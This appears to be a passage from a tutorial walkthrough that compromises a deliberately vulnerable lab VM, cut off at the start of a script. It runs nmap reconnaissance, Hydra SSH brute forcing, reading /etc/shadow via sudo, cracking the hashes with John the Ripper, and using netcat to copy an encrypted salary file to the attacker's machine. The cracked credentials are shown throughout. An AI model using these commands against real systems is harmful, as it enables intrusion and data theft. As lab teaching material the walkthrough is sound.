<pre><code>root@kali ~$ nmap 192.168.1.1,100,254                                     

Starting Nmap 6.25 ( http://nmap.org ) at 2013-07-28 20:56 EDT
Nmap scan report for 192.168.1.1
Host is up (0.00030s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:50:56:C0:00:01 (VMware)

Nmap scan report for 192.168.1.100
Host is up (0.00017s latency).
Not shown: 992 filtered ports
PORT    STATE  SERVICE
20/tcp  closed ftp-data
21/tcp  open   ftp
22/tcp  open   ssh
25/tcp  open   smtp
80/tcp  open   http
110/tcp open   pop3
143/tcp open   imap
443/tcp closed https
MAC Address: 00:0C:29:49:2D:4C (VMware)

Nmap scan report for 192.168.1.254
Host is up (0.000058s latency).
All 1000 scanned ports on 192.168.1.254 are filtered
MAC Address: 00:50:56:F5:1B:D6 (VMware)

Nmap done: 3 IP addresses (3 hosts up) scanned in 21.75 seconds
</code></pre>

<p>As you can see from scanning 192.168.1.1, 192.168.1.100 and 192.168.1.254 we have found what looks like to be our target machine. The default nmap scan checks1000 ports out of the 65535 total, it also shows what the default application that runs on that port is. To get more specific we can run a more comprehensive nmap command for 192.168.1.100:</p>

<pre><code>root@kali ~$ nmap -sS -Pn -sV -O -p 20,21,22,25,80,110,143,443 192.168.1.100                   

Starting Nmap 6.25 ( http://nmap.org ) at 2013-07-28 21:37 EDT
Nmap scan report for 192.168.1.100
Host is up (0.00026s latency).
PORT    STATE  SERVICE  VERSION
20/tcp  closed ftp-data
21/tcp  open   ftp      vsftpd (broken: could not bind listening IPv4 socket)
22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
25/tcp  open   smtp?
80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
110/tcp open   pop3     Openwall popa3d
143/tcp open   imap     UW imapd 2004.357
443/tcp closed https
MAC Address: 00:0C:29:49:2D:4C (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.13 - 2.6.32
Network Distance: 1 hop
Service Info: OS: Unix

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.57 seconds
</code></pre>

<p>Let&rsquo;s breakdown the options used:</p>

<ul>
<li>-sS This is the default scan method for nmap. It&rsquo;s called a SYN scan. When a machine wishes to communicate with another machine using TCP they must complete the TCP handshake. Nmap sends a SYN TCP packet to the target address, if the target responds with the SYN ACK packet, the port is determined as open. Nmap will not complete the handshake by sending the ACK packet back to the target, so it&rsquo;s moderately stealthy.</li>
<li>-Pn This wasn&rsquo;t needed in this instance but I generally include it with single scan. This option skips nmap&rsquo;s host discovery. When performing a scan across multiple IPs map will split the targets up according how &ldquo;active&rdquo; they are deemed to be from an initial response. Disabling this option omits the initial scan and proceeds to run all options against the given IP address range.</li>
<li>-sV  This option probes open ports for more information to help identify the service and the version.</li>
<li>-O Operating System Detection. In this case we know that that the target is a Linux based OS already. However it doesn&rsquo;t hurt to run with this option just for practice. This mode sends multiple TCP and UDP packets to the target. These results are cross referenced with a database of collected signatures to help identify the operating system of the machine. Be warned, these results can be misleading at times.</li>
<li>-p It is often prudent to do an initial scan across a range of IP addresses to pick out the running ports (like we did in our first nmap scan) then target the found open ports in another more intrusive scan. For this command the ports are listed afterwards separated by commas.</li>
</ul>


<p>We now have a list of ports open, and an almost complete list of services and version numbers. What might be confusing here is that some ports are listed as closed. Wait, surely ports wouldn&rsquo;t be listed if they are closed? Well actually what nmap is saying is that the port itself is open, but there is no application listening on the port to communicate with.</p>

<p>Before we compile our list so far I wanted to cover off something else quickly that can often reveal more information about a target. Let&rsquo;s scan again with the-A option:</p>

<pre><code>root@kali ~$ nmap -sS -Pn -sV -O -A -p 20,21,22,25,80,110,143,443 192.168.1.100                

Starting Nmap 6.25 ( http://nmap.org ) at 2013-07-28 21:42 EDT
Nmap scan report for 192.168.1.100
Host is up (0.00021s latency).
PORT    STATE  SERVICE  VERSION
20/tcp  closed ftp-data
21/tcp  open   ftp      vsftpd (broken: could not bind listening IPv4 socket)
22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|_sshv1: Server supports SSHv1
25/tcp  open   smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn't have a title (text/html).
110/tcp open   pop3     Openwall popa3d
143/tcp open   imap     UW imapd 2004.357
| imap-capabilities: 
|_  ERROR: Failed to connect to server
443/tcp closed https
MAC Address: 00:0C:29:49:2D:4C (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.13 - 2.6.32
Network Distance: 1 hop
Service Info: OS: Unix

TRACEROUTE
HOP RTT     ADDRESS
1   0.21 ms 192.168.1.100

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 193.72 seconds
</code></pre>

<p>As you can see the -A option does some additional enumeration on the ports and also gives us a traceroute to the target. In fact, -A enables a lot of things. -A enables OS detection (-O), version detection (-sV), script scanning (-sC) and traceroute (&mdash;traceroute). Traceroute simply shows the path that is taken to the target server. Script scanning makes use of nmaps scripting engine to probe ports for more information. For example, in the above scan result we can see that the title of the web page on port 80 has been returned to us, it also helps us see that there could be a problem with the mail server on port 25, FTP server on port 21 and the IMAP service on port 143. Using scripts can be useful like this, especially when you are targeting a single machine or a handful. Using scripts on a large scan can increase the scan time and amount of information to sort through.</p>

<p>Running services:</p>

<ul>
<li>Port 21 FTP vstfpd Version ?</li>
<li>Port 22 SSH OpenSSH Version 4.3</li>
<li>Port 25 SMTP Service? Version ?</li>
<li>Port 80 HTTP Apache Version  2.0.55 (Also running PHP version 5.1.2)</li>
<li>Port 110 POP3 Openwall popa3d Version ?</li>
<li>Port 143 IMAP UW Imapd 2004.357</li>
</ul>


<p>So it looks like we are missing some versions numbers. Is that important? It sure is as one of these services might be vulnerable. However, without knowing what versions are running we would be firing random exploits at them which is time consuming and often unreliable.</p>

<h3>Banner Grabbing and Finger Printing</h3>

<p>I am adding a small section here to cover off these two terms as they should be learnt by the novice penetration tester. When doing a comprehensive scan with nmap (particular with the -sV option) nmap will probe open ports to build a finger print of the service. This finger print is then compared a ever growing database of fingerprints in order to try and match the port up to a service and running version. This act of port probing to retrieve a service name and version is finger printing.</p>

<p>Banner grabbing is essentially part of the finger printing process. It can be done manually and it&rsquo;s worth learning how to do this in some cases. Often, when connecting to a service, a message will be transmitted displaying the service name and possibly version number. This connecting and viewing is used by nmap to help determine the fingerprint of a service. Of course this will only be easily done by a user when connecting to a port running a text based protocol.</p>

<p>As an example we are going to use the program netcat to banner grab the HTTP port. Netcat is known as the Swiss army knife for TCP/UDP connection. It is a tool that is able to read and write to network connections using the TCP or UDP protocol. Learning the complete uses of this tool is out of the scope of this article, but I do suggest you do some research on the tool if it&rsquo;s new to you. More can be read about netcat here and here.</p>

<p>Below shows one possibility of banner grabbing the target machines web port.</p>

<pre><code>root@kali ~$ nc -nvv 192.168.1.100 80 
(UNKNOWN) [192.168.1.100] 80 (http) open
HEAD / HTTP/1.1

HTTP/1.1 400 Bad Request
Date: Mon, 12 Aug 2013 22:43:50
Server: Apache/2.0.55 (Unix) PHP/5.1.2
Connection: close
Content-Type: text/html; charset=iso-8859-1
</code></pre>

<p>Let&rsquo;s break the process down:</p>

<pre><code>nc -nvv 192.168.1.100 80
</code></pre>

<p>Using netcat, connect to 192.168.1.100 on port 80
The option n states that only IP addressing will be used, no DNS
The option vv makes netcat provide extra verbosity</p>

<pre><code>(UNKNOWN) [192.168.1.100] 80 (http) open
</code></pre>

<p>Once the connection has been established the above message will be shown</p>

<pre><code>HEAD / HTTP/1.1
</code></pre>

<p>HEAD is the HTTP command which requests only the pages header, not the full body
/ indicates the main page of the site, or the root location of a site
HTTP/1.1 defines the HTTP version to make the request with
There must be two carriage returns to submit a command in a HTTP request (press ENTER/RETURN twice)
The returned response shows a web server version (Apache/2.0.55), the type of system that it has been compiled for (Unix) and even the PHP version that is running on the machine (PHP/5.1.2). It&rsquo;s worth noting at this point that any competent system administrator could alter any banners running by services to mask their true versions or even service types.</p>

<p>Other HTTP header fields are returned such as Date and Content-Type. Learning about HTTP header fields is a must. I recommend doing some quick googling and reviewing the different types and what they do. Headers of interest are: User-Agent, Content-Type, Cookie, Referrer.</p>

<h3>Website Enumeration</h3>

<p>Enumerating web applications is as MASSIVE area. I recommend reading the Web Application Hackers Handbook 2nd Edition for an in depth look at web applications and how to tackle them. Fortunately we can find some very useful on the target machine&rsquo;s website without having to look far. The <a href="http://192.168.1.100/">http://192.168.1.100/</a> page contains some information about the vulnerable machine. At the bottom of the page there is a link to Game Related Pages. This page contains some information about the fake company.</p>

<p>Using the information provided you can compile a list of e-mail addresses:</p>

<pre><code>marym@herot.net 
patrickp@herot.net
thompsont@herot.net
benedictb@herot.net
genniege@herot.net
michaelp@herot.net
longe@herot.net
adamsa@herot.net
banterb@herot.net
coffeec@herot.net
</code></pre>

<p>You can also compile a list of possible user names (not forgetting some default ones):</p>

<pre><code>webmaster
postmaster 
admin
administrator
guest
root 
marym
mmary
mary 
patrickp
ppatrick
patrick
thompsont
tthompson
thompson
benedictb
bbenedict
benedict 
genniege
egennieg
gennieg
michaelp
pmichael
michael
longe
elong
long
adamsa
aadams
adams
banterb
bbanter
banter
coffeec
ccoffee
coffee
</code></pre>

<p>Gathering such information is essential when profiling an organisation. With a large user name list, it&rsquo;s possible to do large scale login attempts where for each user, a login attempt is tried once or twice with two different passwords. These passwords are used for each account tested. In very large organisations it is likely that a popular password will be used by at least one user.</p>

<h3>Attacking the Box</h3>

<p>Now we have armed ourselves with information about the machine let&rsquo;s run through what we know and attempt to find possible ways into the system.</p>

<p>Searching for exploits can be done in many ways. In this case using Kali gives a newcomer a couple of options: the searchsploit command and Metasploit. The searchsploit command searches through the exploit-db database that is stored locally on Kali. Searching for exploits on Metasploit can be achieved by first running the program with msfconsole then running the search command. As well as using these commands the Internet is also a valuable place to check for exploits that are not in exploitdb or do not have metasploit modules written for them. Remember to be thorough when searching for exploits. As this isn&rsquo;t a perfect world, and there is no naming convention, some exploits listed will effect previous versions and may not appear in your initial search results. It may be worth double checking on various vulnerability listing websites to check if the version of the found service is vulnerable. CVE Details is a nice site that is generally good at checking for vulnerabilities.</p>

<p>Searchsploit example:</p>

<pre><code>root@kali ~$ searchsploit openssh 4.3                                                                                                      
Description                                                                 Path
--------------------------------------------------------------------------- -------------------------
OpenSSH &lt;= 4.3 p1 (Duplicated Block) Remote Denial of Service Exploit       /multiple/dos/2444.sh 
</code></pre>

<p>Metasploit example:</p>

<pre><code>root@kali ~$ msfconsole -q                                                                                                                 
msf &gt; search openssh

Matching Modules
================

   Name                                        Disclosure Date  Rank       Description
   ----                                        ---------------  ----       -----------
   exploit/windows/local/trusted_service_path  2001-10-25       excellent  Windows Service Trusted Path Privilege Escalation
   post/multi/gather/ssh_creds                                  normal     Multi Gather OpenSSH PKI Credentials Collection
</code></pre>

<p>Port 21 FTP &ndash; vstfpd &ndash; Version ?
From the nmap scan it seems that the service is failing to run correctly so it will unlikely be exploitable
Port 22 SSH &ndash; OpenSSH &ndash; Version 4.3
 Only denial of service exploits found
Port 25 SMTP &ndash; Service? &ndash; Version ?
Port doesn&rsquo;t seem to interect with manual commands reference. You can confirm this later with banner grabbing and finger printing techniques
Port 80 HTTP &ndash; Apache &ndash; Version  2.0.55 &ndash; PHP version 5.1.2
No suitable exploits found
Port 110 POP3 &ndash; Openwall popa3d &ndash; Version ?
Unable to finger print server for exact version
Port 143 IMAP &ndash; UW Imapd 2004.357
Unable to finger print server for exact version
So we couldn&rsquo;t make much progress in exploiting the servers for remote access. We can however revert to the information we pulled off the website. Using a brute forcing program we can enumerate some of the active services on the machine and see if we can gain access. Hydra is a great program for this sort of task. It is able to brute force a wide variety of common protocols quickly and has a threading option to increase speed.</p>

<pre><code>root@kali ~$ hydra -L users.txt -P users.txt 192.168.1.100 ssh
Hydra (http://www.thc.org/thc-hydra) starting at 2013-08-12 20:22:25
[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
[DATA] 16 tasks, 1 server, 1369 login tries (l:37/p:37), ~85 tries per task
[DATA] attacking service ssh on port 22
[STATUS] 110.00 tries/min, 110 tries in 00:01h, 1259 todo in 00:12h, 6 active
[STATUS] 87.67 tries/min, 263 tries in 00:03h, 1106 todo in 00:13h, 6 active
[STATUS] 84.86 tries/min, 594 tries in 00:07h, 775 todo in 00:10h, 6 active
  [22][ssh] host: 192.168.1.100   login: bbanter   password: bbanter
[STATUS] 86.67 tries/min, 1040 tries in 00:12h, 329 todo in 00:04h, 6 active
</code></pre>

<p>After a while you will see that the scan picked up an account using their name as a password. Before we rush ahead, let&rsquo;s quickly break down the hydra command:</p>

<ul>
<li>-L users.txt &ndash; User names to test</li>
<li>-P users.txt &ndash; Passwords to test, in this case we are checking to see if users have used theirs (or anyone else&rsquo;s) user names as passwords</li>
<li>192.168.1.100 &ndash; The target IP address</li>
<li>ssh &ndash; The target protocol</li>
</ul>


<p>Now we are armed with a user name and password that we can use to SSH into the target machine. When prompted for a password, enter bbanter .</p>

<pre><code>root@kali ~$ ssh bbanter@192.168.1.100
</code></pre>

<p>So we&rsquo;re  in the machine, what now? Well this is where more enumeration is required. I will explain some of the important commands to gather information about the target. The goal here is to profile the machine from the inside and prioritise where it might be good to start targeting. My favourite reference for Linux privilege escalation is by g0tmi1k. Please be aware that these commands may not work for every distribution of Linux. My suggestion here is to run the commands and see what you get. For some more work and self learning try running a few more from the guide I linked above. This process can be pain stacking but it is normal. Power through!</p>

<p>To start with it&rsquo;s good to see what kernel version is running. This could lead us onto a privilege escalation exploit depending on the version returned:</p>

<pre><code>bbanter@slax:~$ uname -a 
</code></pre>

<p>It&rsquo;s good to list what processes are running as it helps select possible entry points in the system.</p>

<pre><code>bbanter@slax:~$ ps aux
</code></pre>

<p>Processes running as root are good to identify as comprising one of these may give you root access over the machine:</p>

<pre><code>bbanter@slax:~$ ps aux | grep
</code></pre>

<p>Finding out what ports are open and what programs are listening on them can assist in finding a service to exploit. However identifying the service listening often requires root access. It&rsquo;s worth a look though:</p>

<pre><code>bbanter@slax:~$ netstat -antup
</code></pre>

<p>Finding out what other users are on the system may assist in getting in again, but with elevated privileges:</p>

<pre><code>bbanter@slax:~$ cat /etc/passwd
</code></pre>

<p>Finding out about the user groups on the system can also be useful for identifying users with sudo access.</p>

<pre><code>bbanter@slax:~$ cat /etc/group
</code></pre>

<p>If you have access, running the following command will output the shadow file of the system, this is a user list with their respective password hashes. This often requires root to run:</p>

<pre><code>bbanter@slax:~$ cat /etc/shadow
</code></pre>

<p>Generally speaking this user is pretty well locked down. The kernel version has some vulnerabilities but nothing that will give us access to root. The useful output is from the following commands:</p>

<pre><code>bbanter@slax:~$ cat /etc/passwd
root:x:0:0:DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION:/root:/bin/bash
bin:x:1:1:bin:/bin:
daemon:x:2:2:daemon:/sbin:
adm:x:3:4:adm:/var/log:
lp:x:4:7:lp:/var/spool/lpd:
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/:
news:x:9:13:news:/usr/lib/news:
uucp:x:10:14:uucp:/var/spool/uucppublic:
operator:x:11:0:operator:/root:/bin/bash
games:x:12:100:games:/usr/games:
ftp:x:14:50::/home/ftp:
smmsp:x:25:25:smmsp:/var/spool/clientmqueue:
mysql:x:27:27:MySQL:/var/lib/mysql:/bin/bash
rpc:x:32:32:RPC portmap user:/:/bin/false
sshd:x:33:33:sshd:/:
gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
pop:x:90:90:POP:/:
nobody:x:99:99:nobody:/:
aadams:x:1000:10:,,,:/home/aadams:/bin/bash
bbanter:x:1001:100:,,,:/home/bbanter:/bin/bash
ccoffee:x:1002:100:,,,:/home/ccofe:/bin/bash
bbanter@slax:/home/aadams$ cat /etc/group 
root::0:root
bin::1:root,bin,daemon
daemon::2:root,bin,daemon
sys::3:root,bin,adm
adm::4:root,adm,daemon
tty::5:
disk::6:root,adm
lp::7:lp
mem::8:
kmem::9:
wheel::10:root
floppy::11:root
mail::12:mail
news::13:news
uucp::14:uucp
man::15:
audio::17:
video::18:
cdrom::19:
games::20:
slocate::21:
utmp::22:
smmsp::25:smmsp
mysql::27:
rpc::32:
sshd::33:sshd
gdm::42:
shadow::43:
ftp::50:
pop::90:pop
scanner::93:
nobody::98:nobody
nogroup::99:
users::100:
console::101:
</code></pre>

<p>So from these commands we can determine the following:
bbanter and ccoffee are part of the users group
aadams is part of the wheel group
Users seems like a pretty standard group, but what about wheel? The wheel group historically gives users access to to restricted commands. This group in modern UNIX systems (such as Linux) gives users access to the su and sudo commands in order to run commands as the root user. This means out of the users we have the potential of getting into, aadams is more favourable.</p>

<p>We can use hydra again with a few extra options. The main difference here is that we will be using a more comprehensive word list that covers a lot of common passwords.</p>

<pre><code>root@kali ~$ hydra -l aadams -P /usr/share/wordlists/rockyou.txt -e nsr -u -t 128 192.168.1.100 ssh
Hydra v7.3 (c)2012 by van Hauser/THC &amp; David Maciejak - for legal purposes only

Hydra (http://www.thc.org/thc-hydra) starting at 2013-08-13 23:55:47
[DATA] 128 tasks, 1 server, 14344401 login tries (l:1/p:14344401), ~112065 tries per task
[DATA] attacking service ssh on port 22
[STATUS] 438.00 tries/min, 438 tries in 00:01h, 14343963 todo in 545:49h, 128 active
[STATUS] 386.00 tries/min, 1158 tries in 00:03h, 14343243 todo in 619:19h, 128 active
[STATUS] 354.00 tries/min, 2478 tries in 00:07h, 14341923 todo in 675:14h, 128 active
[STATUS] 349.27 tries/min, 5239 tries in 00:15h, 14339162 todo in 684:16h, 128 active
[STATUS] 339.68 tries/min, 10530 tries in 00:31h, 14333871 todo in 703:19h, 128 active
[STATUS] 338.70 tries/min, 15919 tries in 00:47h, 14328482 todo in 705:05h, 128 active
[STATUS] 338.40 tries/min, 21319 tries in 01:03h, 14323082 todo in 705:27h, 128 active
[STATUS] 338.97 tries/min, 26779 tries in 01:19h, 14317622 todo in 703:59h, 128 active
[STATUS] 338.73 tries/min, 32179 tries in 01:35h, 14312222 todo in 704:14h, 128 active
[22][ssh] host: 192.168.1.100   login: aadams   password: nostradamus
</code></pre>

<p>This hydra command is a bit more complex to look at but it&rsquo;s pretty straight forward:</p>

<ul>
<li>-l aadams Where aadams is the user we&rsquo;re testing</li>
<li>-P /usr/share/wordlists/rockyou.txt This is a really good word list full of common base words and common passwords. It is shipped with Kali by default.</li>
<li>-u This option makes hydra check each password for each user, rather than checking every password for each user. It&rsquo;s more effective than doing one user at a time.</li>
<li>-t 128 This is how many threads you want hydra to create. Increasing this value can give you some more speed when brute forcing as you can run multiple attacks in parallel.</li>
<li>-n esr This parameter enables a couple of options:

<ul>
<li>n test for null password</li>
<li>s test password the same as the user name</li>
<li>r reversed login as password</li>
</ul>
</li>
<li>192.168.1.100 &ndash; The target IP address</li>
<li>ssh &ndash; The target protocol</li>
</ul>


<p>We can now login to aadams with the password nostradamus.</p>

<pre><code>root@kali ~$ ssh aadams@192.168.1.100
</code></pre>

<p>Again we need to enumerate this user and see what we can find out. Try running the commands from before and check the outputs.</p>

<p>The command that should have shown something interesting should have been:</p>

<pre><code>aadams@slax:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

#1) Respect the privacy of others.
#2) Think before you type.
#3) With great power comes great responsibility.

Password:
User aadams may run the following commands on this host:
    (root) NOEXEC: /bin/ls
    (root) NOEXEC: /usr/bin/cat
    (root) NOEXEC: /usr/bin/more
    (root) NOEXEC: !/usr/bin/su *root*
</code></pre>

<p>So what does this tell us? It means that aadams has sudo access on the machine, meaning running commands as root. Remember before when we tried to view the shadow file and we had a denied message? Well let&rsquo;s try that again with sudo:</p>

<pre><code>aadams@slax:~$ sudo cat /etc/shadow  
Password:
root:$1$TOi0HE5n$j3obHaAlUdMbHQnJ4Y5Dq0:13553:0:::::
bin:*:9797:0:::::
daemon:*:9797:0:::::
adm:*:9797:0:::::
lp:*:9797:0:::::
sync:*:9797:0:::::
shutdown:*:9797:0:::::
halt:*:9797:0:::::
mail:*:9797:0:::::
news:*:9797:0:::::
uucp:*:9797:0:::::
operator:*:9797:0:::::
games:*:9797:0:::::
ftp:*:9797:0:::::
smmsp:*:9797:0:::::
mysql:*:9797:0:::::
rpc:*:9797:0:::::
sshd:*:9797:0:::::
gdm:*:9797:0:::::
pop:*:9797:0:::::
nobody:*:9797:0:::::
aadams:$1$6cP/ya8m$2CNF8mE.ONyQipxlwjp8P1:13550:0:99999:7:::
bbanter:$1$hl312g8m$Cf9v9OoRN062STzYiWDTh1:13550:0:99999:7:::
ccoffee:$1$nsHnABm3$OHraCR9ro.idCMtEiFPPA.:13550:0:99999:7:::
</code></pre>

<p>Great! We now have hashes of the users on the system. Our main target is to gain root access on the machine, so to do this we need to find out what the root password is.</p>

<p>Password Cracking
So now we have the hashes for the users on the system, we can use a widely used program called John the Ripper to try and crack them.</p>

<p>Before we start you might be thinking what&rsquo;s a hash? A hash is a one way form of encryption. You take an input value, push it through a hashing algorithm and out comes a value that should be irreversible. The way password hashes are cracked is by taking possible passwords, pushing them through the required algorithm, and see if the hash generated matches the hash you are trying to crack.</p>

<p>Firstly let&rsquo;s prepare by making a file containing the hashes we wish to crack. To do this we can use an inline technique that can also be used to transfer files easily from your machine into your target shell.</p>

<pre><code>root@kali ~$ cat &gt; hashes.txtroot:$1$TOi0HE5n$j3obHaAlUdMbHQnJ4Y5Dq0:13553:0:::::aadams:$1$6cP/ya8m$2CNF8mE.ONyQipxlwjp8P1:13550:0:99999:7:::
bbanter:$1$hl312g8m$Cf9v9OoRN062STzYiWDTh1:13550:0:99999:7:::
ccoffee:$1$nsHnABm3$OHraCR9ro.idCMtEiFPPA.:13550:0:99999:7:::
^D 
</code></pre>

<p>This form of cat command is creating a new file called hashes.txt. The input of the file comes afterwards where you simply type in the rest of the contents. The ^D is not typed, but represents the pressing CTRL+D. This closes the file that has been open for writing.</p>

<p>Now that our hashes are in a file locally let&rsquo;s run john to try and crack them. You might be thinking &ldquo;Hey! We know two of these already?&rdquo; We are going to leave them in there for some practice!</p>

<p>The first command we are going to use john&rsquo;s single mode. This mode loads the rules from the Single rule set in johns configuration file. You can look at these if you want to, but understanding them is out of the scope of this particular article. If you want to check it out you can find the file at /etc/john/john.conf. Simply put, this mode attempts to create passwords based on simple and common rules to guess hashed passwords.</p>

<p>It&rsquo;s worth mentioning that john is able to interpret shadow files in their raw format. Hash type detection and the use of user names in the system are done dynamically by john. Other password cracking tools are not so friendly so it&rsquo;s worth being aware that you may need to extract each hash from shadow files and other hash dumps when using other tools.</p>

<pre><code>root@kali ~$ john -single -pot:deice.pot hashes.txt                                                                             
Loaded 4 password hashes with 4 different salts (FreeBSD MD5 [128/128 SSE2 intrinsics 12x])
bbanter          (bbanter)
guesses: 1  time: 0:00:00:00 DONE (Thu Aug 15 11:38:46 2013)  c/s: 24122  trying: root1907 - root1900
Use the "--show" option to display all of the cracked passwords reliably
</code></pre>

<p>As you can see john quickly cracked bbanter&rsquo;s password as it was the same as their user name. Here&rsquo;s a quick breakdown of the command:</p>

<ul>
<li>-single &ndash; enable simple rule set for guessing passwords</li>
<li>-pot:deice-pot &ndash; A pot file is the jargon used to describe a file containing cracked passwords. The contents is usually stored as hash:password. This file will hold our cracked passwords for this exercise</li>
<li>hashes.txt &ndash; the file of un-cracked passwords we made earlier</li>
</ul>


<p>The -single option is only so good. It will not be able to generate meaningful passwords that some users will use. This is where we will use the rockyou.txt word list once again to try and crack the remaining hashes.</p>

<pre><code>root@kali ~$ john -wordlist:/usr/share/wordlists/rockyou.txt -pot:deice.pot hashes.txt                                          
Loaded 4 password hashes with 4 different salts (FreeBSD MD5 [128/128 SSE2 intrinsics 12x])
Remaining 3 password hashes with 3 different salts
nostradamus      (aadams)
tarot            (root)
hierophant       (ccoffee)
guesses: 3  time: 0:00:01:09 DONE (Thu Aug 15 11:55:59 2013)  c/s: 29217  trying: hieuloan - hieper
Use the "--show" option to display all of the cracked passwords reliably
</code></pre>

<p>The -wordlist:/usr/share/wordlists/rockyou.txt is the only parameter different here (swapped out for -single). It simply points to where the word list to be used is located and enables the word list attack method.</p>

<p>So we now have passwords for all the users on the system! Is that it? Well no! Having root access is great, but it doesn&rsquo;t mean anything to a company that you might be testing. They will want to be told something a bit less technical like: &ldquo;I was able to compromise your server and gain access to confidential files.&rdquo;. So, let&rsquo;s try and do that!</p>

<h3>Hunting for Treasure</h3>

<pre><code>Let's try and log into the root account over SSH. SSH is commonly configured so that root can not be logged into remotely. But let's confirm that.
root@kali ~$ ssh root@192.168.1.100                                                                                                        
root@192.168.1.100's password: 
Permission denied, please try again.
root@192.168.1.100's password: 
Permission denied, please try again.
root@192.168.1.100's password: 
Permission denied (publickey,password,keyboard-interactive).
</code></pre>

<p>As we can see it doesn&rsquo;t seem to want to let us in that way, but it doesn&rsquo;t matter, we can use the switch user command (su) on aadams to get to root:</p>

<pre><code>root@kali ~$ ssh aadams@192.168.1.100                                                                                               255 â†µ  
aadams@192.168.1.100's password: 
Linux 2.6.16.
aadams@slax:~$ su root
Password: *****
root@slax:/home/aadams# 
</code></pre>

<p>So we are now running as root and have the run of the entire system. So let&rsquo;s hunt around for any files that might look interesting.</p>

<p>A good place to start is in the user&rsquo;s (and root&rsquo;s) home directories. It is a common place for storing files and the most likely place to find something interesting. Let&rsquo;s run the following commands:</p>

<pre><code>root@slax:/home/aadams# ls -lsaRhS /root/
root@slax:/home/aadams# ls -lsaRhS /home/
</code></pre>

<p>Here we are making use of the ls command (the equivalent of dir in windows) to list the the contents of these directories. The options used mean:</p>

<ul>
<li>l &ndash; show the results in a list format which displays permissions and ownership</li>
<li>s &ndash; display the size of the file</li>
<li>a &ndash; display all files and directories, including hidden files and folders (files and folders starting with a .)</li>
<li>R &ndash; go through all folders recursively and list their contents too</li>
<li>h &ndash; make the file sizes human readable rather than in block format (4KB, 2GB etc)</li>
<li>S &ndash; sort by file size</li>
</ul>


<p>I&rsquo;m not going to paste the entire outputs of both commands due to size, but the following excerpt from enumerating the /home/ directory should show something interesting:</p>

<pre><code>/home/ftp/incoming:
total 140K
140K -r-xr-xr-x 1 root root 130K Jun 29  2007 salary_dec2003.csv.enc
   0 dr-xr-xr-x 2 root root   80 Jun 29  2007 .
   0 drwx------ 3 root root   60 Jun 29  2007 ..
</code></pre>

<p>What&rsquo;s this? An encrypted file? It is likely that this is the sort of treasure we are looking for. Let&rsquo;s use netcat to transfer the file of of the machine. To do this we need to create a listener on our machine and pipe the traffic from the input into a file:</p>

<pre><code>root@kali ~$ nc -lvvp 4444 &gt; salary_dec2003.csv.enc
</code></pre>

<p>A quick run down of this command:</p>

<ul>
<li>l &ndash; State that we are going to be listening</li>
<li>vv &ndash; Show extra verbosity</li>
<li>p &ndash; We are going to supply a port for listening</li>
<li>4444 &ndash; This is the port will be listening on</li>
</ul>


<p>Back on the ssh session of the target machine we are going to transfer the file through netcat to the listening port on our local machine:</p>

<pre><code>root@slax:/home/aadams# cd /home/ftp/incoming/
root@slax:/home/ftp/incoming# nc -nvv 192.168.1.141 4444 &lt; salary_dec2003.csv.enc
</code></pre>

<p>Be aware that netcat will not tell you once the file has finished transferring. It is a good idea to open another shell and do ls -ls salary_dec2004.csv.enc to check when the file has stopped increasing in size. Here is the output from both of the netcat commands:</p>

<p>On target system:</p>

<pre><code>root@slax:/home/aadams# cd /home/ftp/incoming/
root@slax:/home/ftp/incoming# nc -nvv 192.168.1.141 4444 &lt; salary_dec2003.csv.enc 
(UNKNOWN) [192.168.1.141] 4444 (krb524) open
 sent 133056, rcvd 0
</code></pre>

<p>On local system:</p>

<pre><code>root@kali ~$ nc -lvvp 4444 &gt; salary_dec2003.csv.enc                                                                             
listening on [any] 4444 ...
192.168.1.100: inverse host lookup failed: Unknown server error : Connection timed out
connect to [192.168.1.141] from (UNKNOWN) [192.168.1.100] 45972
 sent 0, rcvd 133056
</code></pre>

<p>Great we have the file, let&rsquo;s check to see if it&rsquo;s actually an encrypted file. We can use the file command on linux to try and identify it.</p>

<pre><code>root@kali ~$ file salary_dec2003.csv.enc
salary_dec2003.csv.enc: data 
</code></pre>

<p>It says the file is data, well that&rsquo;s no good, we&rsquo;ll need to dig a bit deeper. Using strings and head we can get the string representation of the file, but just take the top of the file for inspection. This is a great way to check obscure file types and analyse them for identification.</p>

<pre><code>root@kali ~$ strings salary_dec2003.csv.enc | head
Salted__n
Lw$A`
YN&gt;7
#ki8
/&gt;&lt;b
Wm&amp;/
KU'M
R|T&amp;
@/CP/
 0"Kt
</code></pre>

<p>After googling Salted__ header it seems that the encryption method used is openssl. openssl is an application that can be used to encrypt and decrypt files. But what algorithm was used to encrypt the file? This is where things might get confusing if you&rsquo;ve never made scripts before. I have created a script that brute forces all the possible known cipher types used in the openssl program.</p>

<p>Here is the script I created to assist with this scenario.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
